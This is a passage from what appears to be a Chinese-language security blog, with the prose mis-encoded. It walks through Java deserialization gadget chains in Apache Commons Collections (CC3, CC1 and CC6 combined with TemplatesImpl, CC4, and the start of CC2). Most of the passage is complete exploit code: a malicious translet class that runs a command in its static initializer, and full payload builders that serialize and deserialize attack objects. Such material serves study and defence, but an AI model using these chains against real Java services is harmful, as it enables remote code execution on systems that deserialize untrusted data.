setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); templates.newTransformer(); } public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException { Class clazz=object.getClass(); Field declaredField=clazz.getDeclaredField(field_name); declaredField.setAccessible(true); declaredField.set(object,filed_value); } æŠ¥é”™ï¼Ÿè°ƒè¯•è·Ÿè¿›è§£å†³è¿è¡Œ å‘ç°åœ¨ defineTransletClasses æŠ¥äº†ç©ºæŒ‡é’ˆé”™è¯¯ ï¼Ÿï¼Ÿï¼Ÿ æˆ‘ä»¬è·Ÿè¿›å»è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹ åœ¨è¿™é‡Œå®ƒè¿›è¡Œäº†ä¸€ä¸ªçˆ¶ç±»çš„åˆ¤æ–­ åˆ¤æ–­å®ƒçˆ¶ç±»æ˜¯ä¸æ˜¯è¿™ä¸ª ABSTRACT_TRANSLET ä¸æ˜¯çš„è¯ä¼šè°ƒç”¨ä¸‹é¢ _auxClasses.put é‚£ä¹ˆç°åœ¨å°±æœ‰ä¸¤ç§æ–¹æ³• è¦ä¹ˆ è®©å®ƒçˆ¶ç±» equals ABSTRACT_TRANSLET è¦ä¹ˆ è®© _auxClasses ä¸ä¸ºnullä½†æ˜¯æˆ‘ä»¬æ³¨æ„åˆ°ä¸‹é¢ä¹Ÿæœ‰ä¸€ä¸ªåˆ¤æ–­ 1234if (_transletIndex &lt; 0) { ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } å¦‚æœ _transletIndex &lt; 0 ä¼šæŠ›å‡ºå¼‚å¸¸ è€Œå¦‚æœä¸è¿›ifè¯­å¥é‡Œ(ä¸æ»¡è¶³çˆ¶ç±» equals ABSTRACT_TRANSLET) _transletIndexå°±æ˜¯ -1 ä¹Ÿä¸å¾—è¡Œ è¿˜ä¼šæŠ¥é”™ å› æ­¤æˆ‘ä»¬åº”è¯¥æ»¡è¶³ æ„é€ çš„é‚£ä¸ªç±» çˆ¶ç±»æ˜¯ ABSTRACT_TRANSLET æ˜¯ abstractæŠ½è±¡ç±»ï¼Œå› æ­¤æˆ‘ä»¬ä¹Ÿè¦é‡å†™è¿™ä¸ªç±»çš„æ–¹æ³• æ¶æ„ç±»åº”è¯¥æ”¹ä¸ºï¼š 12345678910111213141516171819202122232425import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class evil extends AbstractTranslet { static { try { Runtime.getRuntime().exec(&quot;calc&quot;); } catch (IOException e) { throw new RuntimeException(e); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }} ç°åœ¨æ‰§è¡Œä¸€ä¸‹è¯•ä¸€ä¸‹ ä»£ç å°±æˆåŠŸæ‰§è¡Œäº† (3) CC1 + TemplatesImpl ç»“åˆä¸Šé¢TemplatesImpl ææ‡‚äº†ä¹‹å å°±å¥½è¯´äº†æˆ‘ä»¬ä¸æ˜¯è¦æ‰§è¡Œ TemplatesImpl.newTransformer() æ–¹æ³•å˜› è¿™é‡Œæˆ‘ä»¬é€šè¿‡CC1çš„sinkç‚¹ é€šè¿‡transformåå°„è°ƒç”¨ TemplatesImpl.newTransformer() é“¾å­æ²¡å˜ åªæ˜¯æœ€åå‘½ä»¤æ‰§è¡Œæ–¹å¼æ”¹äº†ä¸€ä¸‹ä¿®æ”¹expä¸ºï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.TransformerConfigurationException;import java.io.*;import java.lang.reflect.*;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class CC1_TemplatesImpl { public static void main(String[] args) throws TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,&quot;_name&quot;,&quot;1vxyz&quot;); byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\\\Java-IDEA\\\\java_workspace\\\\CC\\\\target\\\\classes\\\\org\\\\example\\\\evil.class&quot;)); byte[][] codes = {code}; setFieldValue(templates,&quot;_bytecodes&quot;,codes); setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); //templates.newTransformer(); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(templates), new InvokerTransformer(&quot;newTransformer&quot;, null,null), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); //chainedTransformer.transform(1); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer); Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationInvocationhdlConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Override.class, lazyMap); Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h); Object o = annotationInvocationhdlConstructor.newInstance(Override.class, mapProxy); //serialize(o); unserialize(&quot;cc1_templatesImpl.bin&quot;); } public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException { Class clazz=object.getClass(); Field declaredField=clazz.getDeclaredField(field_name); declaredField.setAccessible(true); declaredField.set(object,filed_value); } public static void serialize(Object o) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;cc1_templatesImpl.bin&quot;)); oos.writeObject(o); } public static void unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); ois.readObject(); } } (4) CC6 + TemplatesImpl ç»“åˆåŒç† CC6ä¸ TemplatesImplç»“åˆçš„è¯ï¼Œä¹Ÿæ˜¯æœ€ç»ˆsinkç‚¹ transformåå°„è°ƒç”¨ TemplatesImpl.newTransformer() expå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172```plaintextpackage org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class CC6_TemplatesImpl { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,&quot;_name&quot;,&quot;1vxyz&quot;); byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\\\Java-IDEA\\\\java_workspace\\\\CC\\\\target\\\\classes\\\\org\\\\example\\\\evil.class&quot;)); byte[][] codes = {code}; setFieldValue(templates,&quot;_bytecodes&quot;,codes); setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); //templates.newTransformer(); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(templates), new InvokerTransformer(&quot;newTransformer&quot;, null,null), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;aaa&quot;); HashMap&lt;Object,Object&gt; map2 = new HashMap&lt;&gt;(); map2.put(tiedMapEntry,&quot;bbb&quot;); lazyMap.remove(&quot;aaa&quot;); Class c = LazyMap.class; Field factory = c.getDeclaredField(&quot;factory&quot;); factory.setAccessible(true); factory.set(lazyMap,chainedTransformer); //serialize(map2); unserialize(&quot;sercc6_templatesImpl.bin&quot;); } public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException { Class clazz=object.getClass(); Field declaredField=clazz.getDeclaredField(field_name); declaredField.setAccessible(true); declaredField.set(object,filed_value); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;sercc6_templatesImpl.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); return ois.readObject(); }} (5) CC3æœ¬èº«é“¾å­åˆ†æäº‹å®ä¸Š æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ª TemplatesImplåŠ è½½æ¶æ„ç±» æ˜¯é€šè¿‡TemplatesImpl.newTransformer() æˆ‘ä»¬è¿˜å¯ä»¥å†å¾€ä¸Šæ‰¾æ‰¾ï¼Œçœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆåœ°æ–¹è°ƒç”¨äº† newTransformer() å¯ä»¥è¢«åˆ©ç”¨å‘¢ï¼Ÿ è¿™é‡Œæˆ‘ä»¬æ‰¾åˆ°äº† TrAXFilterç±» ä¸ºä»€ä¹ˆåˆ©ç”¨ç‚¹æ˜¯ TrAXFilterç±» ä¸æ˜¯å…¶ä»–ä¸¤ä¸ªå‘¢ Process è¿™ä¸ªåœ¨ main é‡Œé¢ï¼Œæ˜¯ä½œä¸ºä¸€èˆ¬å¯¹è±¡ç”¨çš„ï¼Œæ‰€ä»¥ä¸ç”¨å®ƒ ç¬¬äºŒä¸ª getOutPropertiesï¼Œæ˜¯åå°„è°ƒç”¨çš„æ–¹æ³•ï¼Œå¯èƒ½ä¼šåœ¨ fastjson çš„æ¼æ´é‡Œé¢è¢«è°ƒç”¨ TransformerFactoryImpl ä¸èƒ½åºåˆ—åŒ–ï¼Œå¦‚æœè¿˜æƒ³ä½¿ç”¨å®ƒä¹Ÿæ˜¯ä¹Ÿå¯èƒ½çš„ï¼Œä½†æ˜¯éœ€è¦ä¼ å‚ï¼Œæˆ‘ä»¬éœ€è¦å»æ‰¾æ„é€ å‡½æ•°ã€‚è€Œå®ƒçš„æ„é€ å‡½æ•°éš¾ä¼ å‚ è‡³äºTrAXFilterï¼Œè™½ç„¶å®ƒä¹Ÿæ˜¯ä¸èƒ½åºåˆ—åŒ–çš„ï¼Œä½†æ˜¯å®ƒçš„æ„é€ å‡½æ•°é‡Œæœ‰æå¤´ æŸ¥çœ‹è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³• å¯ä»¥æ‰§è¡Œè¿™ä¸ªå³å¯å‘½ä»¤æ‰§è¡Œ _transformer = (TransformerImpl) templates.newTransformer(); æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œå¦‚æœå¯ä»¥è°ƒç”¨è¿™ä¸ªæ„é€ æ–¹æ³•çš„è¯ï¼Œå°±å¯ä»¥è°ƒç”¨æˆ‘ä»¬çš„ .newTransformer() ä½†æ˜¯è¿™ä¸ªç±»æ˜¯ä¸èƒ½è¢«åºåˆ—åŒ–çš„ å°±åªèƒ½åƒä¹‹å‰è·å–Runtimeä¸€æ · ä»å®ƒçš„Classå…¥å£ é€šè¿‡æ„é€ å‡½æ•°èµ‹å€¼ CC3 è¿™é‡Œçš„ä½œè€…æ²¡æœ‰è°ƒç”¨ InvokerTransformerï¼Œè€Œæ˜¯è°ƒç”¨äº†ä¸€ä¸ªæ–°çš„ç±» InstantiateTransformer å¯ä»¥çœ‹ä¸€ä¸‹è¿™ä¸ªç±»çš„transformæ–¹æ³• è¿™é‡Œå®ƒä¼šåˆ¤æ–­å‚æ•° æ˜¯å¦æ˜¯CLassç±»å‹ï¼Œæ˜¯çš„è¯ ç„¶åä¼šè·å–è¿™ä¸ªæŒ‡å®šå‚æ•°ç±»å‹çš„Classï¼ŒæŒ‡æ„é€ å™¨ ç„¶åè°ƒå®ƒçš„æ„é€ å‡½æ•° .newInstance()å®ä¾‹åŒ– å®Œç¾ç¬¦åˆäº†æˆ‘ä»¬çš„éœ€æ±‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ InstantiateTransformer.transform() è·å– TrAXFilterç±»æ„é€ å™¨å¹¶åˆå§‹åŒ– å®ç° templates.newTransformer() é‚£æˆ‘ä»¬çœ‹çœ‹å®ƒçš„å‚æ•° Class[] paramTypes æ„é€ å‡½æ•°çš„å‚æ•°ç±»å‹ Object[] args å‘½ä»¤æ‰§è¡Œä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections.functors.InstantiateTransformer;import javax.xml.transform.Templates;import javax.xml.transform.TransformerConfigurationException;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class CC3Test { public static void main(String[] args) throws TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,&quot;_name&quot;,&quot;1vxyz&quot;); byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\\\Java-IDEA\\\\java_workspace\\\\CC\\\\target\\\\classes\\\\org\\\\example\\\\evil.class&quot;)); byte[][] codes = {code}; setFieldValue(templates,&quot;_bytecodes&quot;,codes); setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); //templates.newTransformer(); InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}); instantiateTransformer.transform(TrAXFilter.class); } public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException { Class clazz=object.getClass(); Field declaredField=clazz.getDeclaredField(field_name); declaredField.setAccessible(true); declaredField.set(object,filed_value); } public static void serialize(Object o) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;sercc3.bin&quot;)); oos.writeObject(o); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); return ois.readObject(); }} CC3ååºåˆ—åŒ–é“¾EXPé‚£ååºåˆ—åŒ–çš„é“¾å­ å®é™…ä¸Šå°±æ‰¾ è°ƒç”¨äº† .transformer()çš„å¯æ§çš„é“¾å°±è¡Œ æˆ‘ä»¬å‰é¢çš„CC1ã€CC3éƒ½å¯ç”¨ï¼Œé€‰ä¸€ä¸ªå½“å‰åŠéƒ¨åˆ†å³å¯ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.Templates;import javax.xml.transform.TransformerConfigurationException;import java.io.*;import java.lang.reflect.*;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class CC3Test { public static void main(String[] args) throws TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,&quot;_name&quot;,&quot;1vxyz&quot;); byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\\\Java-IDEA\\\\java_workspace\\\\CC\\\\target\\\\classes\\\\org\\\\example\\\\evil.class&quot;)); byte[][] codes = {code}; setFieldValue(templates,&quot;_bytecodes&quot;,codes); setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); //templates.newTransformer(); InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}); //instantiateTransformer.transform(TrAXFilter.class); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), // æ„é€  setValue çš„å¯æ§å‚æ•° instantiateTransformer }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer); Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationInvocationhdlConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Override.class, lazyMap); Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h); Object o = annotationInvocationhdlConstructor.newInstance(Override.class, mapProxy); //serialize(o); unserialize(&quot;sercc3.bin&quot;); } public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException { Class clazz=object.getClass(); Field declaredField=clazz.getDeclaredField(field_name); declaredField.setAccessible(true); declaredField.set(object,filed_value); } public static void serialize(Object o) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;sercc3.bin&quot;)); oos.writeObject(o); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); return ois.readObject(); }} æ€»ç»“CC3 å…³é”®åœ¨äºç†è§£è¿™ä¸ª TemplatesImplé“¾å­ åŠ è½½æ¶æ„ç±»çš„åˆ©ç”¨ã€‚ æ„æˆCC3ååºåˆ—åŒ–é“¾çš„å‘½ä»¤æ‰§è¡Œç‚¹ å‰é¢çš„ååºåˆ—åŒ–é“¾çš„è¯ï¼Œå¤§ä½“ä¸Šéƒ½è¿˜æ˜¯ CC1å’ŒCC6çš„ Â·Â·Â·Â· -&gt; lazyMap.get() -&gt; InvokerTransformer.transform() æ€»ç»“çš„æµç¨‹å›¾ï¼š","link":"/2023/06/07/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collection%E7%AF%8703-CC3%E9%93%BE/"},{"title":"Javaååºåˆ—åŒ–Commons-Collectionç¯‡04-CC4é“¾","text":"&lt;1&gt;ç¯å¢ƒåˆ†æå› ä¸º CommonsCollections4 é™¤ 4.0 çš„å…¶ä»–ç‰ˆæœ¬å»æ‰äº† InvokerTransformer ä¸å†ç»§æ‰¿ Serializableï¼Œå¯¼è‡´æ— æ³•åºåˆ—åŒ–ã€‚åŒæ—¶ CommonsCollections 4çš„ç‰ˆæœ¬ TransformingComparator ç»§æ‰¿äº† Serializableæ¥å£ï¼Œè€ŒCommonsCollections 3é‡Œæ˜¯æ²¡æœ‰çš„ã€‚è¿™ä¸ªå°±æä¾›äº†ä¸€ä¸ªæ”»å‡»çš„è·¯å¾„ jdkï¼šjdk8u65CCï¼šCommons-Collections 4.0pom.xml æ·»åŠ  12345&lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; &lt;version&gt;4.0&lt;/version&gt; &lt;/dependency&gt; &lt;2&gt;é“¾å­åˆ†æCC4å®é™…ä¸Šæ˜¯ å¦ä¸€ä¸ªåˆ†æ”¯ï¼Œä¸åŒäºCC1ç”¨ LazyMap.get() è°ƒç”¨ .transform() CC4ç”¨TransformingComparator.compare() è°ƒç”¨ CC4çš„å‘½ä»¤æ‰§è¡Œç‚¹åˆ™æ˜¯ TemplatesImplåŠ è½½æ¶æ„ç±» å› æ­¤é“¾å­ååŠæ®µå¯ä»¥æ²¿ç”¨CC3 ä¸éœ€è¦æ›´æ”¹ æˆ‘ä»¬å†æ¥çœ‹ä¸€çœ‹å“ªé‡Œè°ƒç”¨äº† compare è¿™é‡Œçš„è¯ï¼Œæ‰¾åˆ°äº† PriorityQueue ä¼˜å…ˆé˜Ÿåˆ—ç±»é‡Œ è°ƒç”¨äº†compare æˆ‘ä»¬çœ‹ä¸€ä¸‹ CC4çš„é“¾å­æ•´ä½“ä¸ºï¼š 1234567891011/*PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() ChainedTransformer.transform() InstantiateTransformer.transform() TemplatesImpl.newTransformer() defineClass()-&gt;newInstance()*/ &lt;3&gt; ç¼–å†™EXPæŒ‰ç€é“¾å­å†™ä¸‹æ¥ï¼Œåº”è¯¥æ˜¯è¿™æ · 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InstantiateTransformer;import org.apache.commons.collections4.comparators.TransformingComparator;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class CC4Test { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,&quot;_name&quot;,&quot;1vxyz&quot;); byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\\\Java-IDEA\\\\java_workspace\\\\CC\\\\target\\\\classes\\\\org\\\\example\\\\evil.class&quot;)); byte[][] codes = {code}; setFieldValue(templates,&quot;_bytecodes&quot;,codes); setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), instantiateTransformer }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); //transformingComparator.compare(1,2); PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); serialize(priorityQueue); unserialize(&quot;sercc4.bin&quot;); } public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException { Class clazz=object.getClass(); Field declaredField=clazz.getDeclaredField(field_name); declaredField.setAccessible(true); declaredField.set(object,filed_value); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;sercc4.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); return ois.readObject(); }} ä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨ï¼Œæˆ‘ä»¬è°ƒè¯•çœ‹çœ‹å“ªä¸€æ­¥å¡ä½äº† è¿™é‡ŒPriorityQueue.heapify() é‡Œæˆ‘ä»¬åº”è¯¥è¿›å…¥å¾ªç¯ï¼Œæƒ³æ‰§è¡Œ siftDown() ä½†è¿™é‡Œsizeä¸º00&gt;&gt;&gt;1 = 0æˆ‘ä»¬è¿è¡Œä¸€ä¸‹ï¼Œ å¯ä»¥çœ‹é“ 2&gt;&gt;&gt;1 = 1 é‚£æˆ‘ä»¬å°±çŸ¥é“äº† é•¿åº¦sizeä¸º2çš„æ—¶å€™ï¼Œä¼šè¿›å…¥ æˆ‘ä»¬åœ¨é˜Ÿåˆ—ä»£ç é‡Œaddéšä¾¿åŠ ä¸¤ä¸ª 12priorityQueue.add(1);priorityQueue.add(2); å†è¿è¡Œï¼Œå°±å¼¹å‡ºæ¥è®¡ç®—å™¨ã€‚ä½†æ˜¯è¿™é‡Œçš„è¯ï¼Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ å°±æ˜¯ add() -&gt; offer() -&gt; siftUp() -&gt; siftUpUsingComparator() å°±æ˜¯è¿™ä¸ªaddä»–ä¹Ÿä¼šæ‰§è¡Œcompareï¼Œæœ¬åœ°æ‰§è¡Œçš„ å¹¶ä¸æ˜¯é€šè¿‡ååºåˆ—åŒ–å¼¹å‡ºçš„shell æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åˆå§‹åŒ–æ—¶éœ€è¦ï¼Œå…ˆä¸èµ‹å€¼ transformingComparatorï¼Œæ‰§è¡Œå®Œaddä¹‹åï¼Œåå°„å†æ”¹å›æ¥å³å¯æœ€ç»ˆEXPå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InstantiateTransformer;import org.apache.commons.collections4.comparators.TransformingComparator;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class CC4Test { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,&quot;_name&quot;,&quot;1vxyz&quot;); byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\\\Java-IDEA\\\\java_workspace\\\\CC\\\\target\\\\classes\\\\org\\\\example\\\\evil.class&quot;)); byte[][] codes = {code}; setFieldValue(templates,&quot;_bytecodes&quot;,codes); setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), instantiateTransformer }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); //transformingComparator.compare(1,2); PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); priorityQueue.add(1); priorityQueue.add(2); setFieldValue(transformingComparator,&quot;transformer&quot;,chainedTransformer); //serialize(priorityQueue); unserialize(&quot;sercc4.bin&quot;); } public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException { Class clazz=object.getClass(); Field declaredField=clazz.getDeclaredField(field_name); declaredField.setAccessible(true); declaredField.set(object,filed_value); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;sercc4.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); return ois.readObject(); }}","link":"/2023/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collection%E7%AF%8704-CC4%E9%93%BE/"},{"title":"Javaååºåˆ—åŒ–Commons-Collectionç¯‡05-CC2é“¾","text":"&lt;1&gt; ç¯å¢ƒåˆ†æjdkï¼šjdk8u65CCï¼šCommons-Collections 4.0pom.xml æ·»åŠ  12345&lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; &lt;version&gt;4.0&lt;/version&gt; &lt;/dependency&gt; &lt;2&gt; é“¾å­åˆ†æCC2 å®é™…ä¸Šæ˜¯ CC4çš„ä¸€ä¸ªå˜å‹ã€‚ åœ¨CC3ä¸­æˆ‘ä»¬æåˆ°äº† TemplatesImplé“¾ åŠ è½½æ¶æ„ç±»å‘½ä»¤æ‰§è¡Œï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªTemplatesImpl.newTransformer() æ¥ä½œå…¥å£åŠ è½½æ¶æ„ç±» CC2é‡Œçš„åšæ³• å¹¶ä¸æ˜¯åƒCC4 é€šè¿‡ TransformingComparator.compare() -&gt; InstantiateTransformer.transform() -&gt; TrAXFilter.TrAXFilter() å»è°ƒç”¨ TemplatesImpl.newTransformer() è€Œæ˜¯é€šè¿‡ InvokerTransformer.transform() åå°„è°ƒç”¨ TemplatesImpl.newTransformer() å› æ­¤æˆ‘ä»¬å¯ä»¥æ²¿ç”¨ ä¹‹å‰çš„ CC4å’Œ TemplatesImplé“¾ä»£ç  ä¿®æ”¹ä¸€ä¸‹å³å¯ CC2çš„éš¾ç‚¹å°±åªåœ¨äº ç”¨ InvokerTransformer 